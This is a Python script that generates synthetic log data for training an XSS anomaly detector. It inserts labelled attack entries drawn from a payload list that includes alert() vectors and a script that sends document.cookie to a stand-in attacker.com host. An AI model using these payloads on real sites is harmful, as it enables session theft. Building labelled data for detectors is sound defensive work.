"""
Sentinel XSS Injection Module.
Simulates Cross-Site Scripting attacks by injecting script tags 
and event handlers into the 'Message' field.
"""

# Import pandas to handle bulk data
import pandas as pd

# Import random to choice between random services
import random

# Import datetime to set datetime data
from datetime import datetime, timedelta

# Import os to get directories paths
import os

# Localize script path
current_script_path = os.path.abspath(__file__)
current_dir = os.path.dirname(current_script_path)

# Define project root path
project_root = os.path.abspath(os.path.join(current_dir, "..", ".."))

# Define data directories
raw_data_path = os.path.join(project_root, "data", "raw")
processed_data_path = os.path.join(project_root, "data", "processed")

# Create directories if don't exist
os.makedirs(raw_data_path, exist_ok=True)
os.makedirs(processed_data_path, exist_ok=True)

# Define input and output files names
INPUT_FILE: str = str(os.path.join(raw_data_path, "sentinel_logs_data_reinforcement.csv"))
OUTPUT_FILE: str = str(os.path.join(raw_data_path, "sentinel_logs_xss_injection.csv"))

# Configuration datetime limit and seconds range
MIN_DATE = datetime.strptime("2026-02-24 18:15:19", "%Y-%m-%d %H:%M:%S")
MAX_DATE = datetime.strptime("2026-03-26 18:51:49", "%Y-%m-%d %H:%M:%S")
TOTAL_SECONDS_RANGE = int((MAX_DATE - MIN_DATE).total_seconds())

# Set possible xss payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert('XSS')",
    "<svg/onload=alert('XSS')>",
    "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>"
]

# set normal messages from services
NORMAL_MESSAGES = [
    "Page view: index.html",
    "User updated profile picture",
    "Admin dashboard refreshed",
    "API call: get_user_status",
    "CSS resources loaded successfully"
]

def inject_and_balance_xss() -> None:
    """
    Injects XSS attack vectors and balances with normal traffic for UI services.

    This function generates 300 malicious XSS payloads across specific services 
    (Frontend-UI, User-Profile, Admin-Dashboard) and balances the dataset by 
    injecting 1,000 normal ('INFO') logs for the same services. This ensures 
    the model learns to identify attack signatures in the 'Message' field 
    without developing a bias towards specific service names.

    The dataset is then globally re-sorted chronologically and IDs are 
    regenerated to maintain sequence integrity.

    Returns:
        None

    Raises:
        FileNotFoundError: If the balanced base dataset file is not found.
    """

    try:
        # Read CSV file from input path
        df = pd.read_csv(INPUT_FILE)

        # Set service names
        target_services = ["Frontend-UI", "User-Profile", "Admin-Dashboard"]

        # Create a new records list
        new_records = []
        
        # Generate 300 XSS attacks
        for _ in range(300):
            # Define time by the set range
            random_second = random.randint(0, TOTAL_SECONDS_RANGE)
            log_time = MIN_DATE + timedelta(seconds=random_second)

            # Append log to the new records list
            new_records.append({
                "Service name": random.choice(target_services),
                "Log Level": "WARNING",
                "Message": f"Invalid input detected: {random.choice(XSS_PAYLOADS)}",
                "Risk Score": random.randint(70, 95),
                "Is Anomaly": 1,
                "Timestamp": log_time,
                "Process Time": round(random.uniform(5.0, 10.0), 2)
            })

        # Generate 3000 normal logs
        for _ in range(3000):
            # Define time by the set range
            random_second = random.randint(0, TOTAL_SECONDS_RANGE)
            log_time = MIN_DATE + timedelta(seconds=random_second)

            # Add new log to new records
            new_records.append({
                "Service name": random.choice(target_services),
                "Log Level": "INFO",
                "Message": random.choice(NORMAL_MESSAGES),
                "Risk Score": random.randint(0, 15),
                "Is Anomaly": 0,
                "Timestamp": log_time,
                "Process Time": random.randint(5, 25)
            })
            
        # Concatenate new records to actual logs
        df_new = pd.DataFrame(new_records)
        df_final = pd.concat([df, df_new], ignore_index=True)
        
        # Transfrom timestamp to datetime datatype
        df_final['Timestamp'] = pd.to_datetime(df_final['Timestamp'])

        # Sort values by timestamp
        df_final = df_final.sort_values(by='Timestamp').reset_index(drop=True)

        # Reorder IDs
        df_final['ID'] = range(1, len(df_final) + 1)
        
        # Revert Timestamp back to string format to match the original CSV style
        df_final['Timestamp'] = df_final['Timestamp'].dt.strftime("%Y-%m-%d %H:%M:%S")

        # Save file without pandas generated index
        df_final.to_csv(OUTPUT_FILE, index=False)
        print(f"Phase 4 Complete: Injected XSS injection scripts. Total: {len(df_final)} logs")

    # Exception if there's an error
    except FileNotFoundError:
        print(f"Error: Not found {INPUT_FILE} file.")

# Execute function
if __name__ == "__main__":
    inject_and_balance_xss()